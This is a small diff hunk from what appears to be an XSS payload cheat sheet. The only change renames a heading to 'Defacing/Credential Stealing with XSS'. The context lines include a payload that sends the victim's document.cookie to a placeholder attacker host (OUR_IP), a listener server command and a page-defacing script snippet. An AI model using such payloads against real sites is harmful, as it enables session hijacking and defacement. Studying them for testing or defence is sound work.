@@ -132,7 +132,7 @@ php -S 0.0.0.0:80
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
-## Defacing with XSS
+## Defacing/Credential Stealing with XSS
 ```javascript
 // Change Background
 <script>document.body.style.background = "#141d2b"</script>
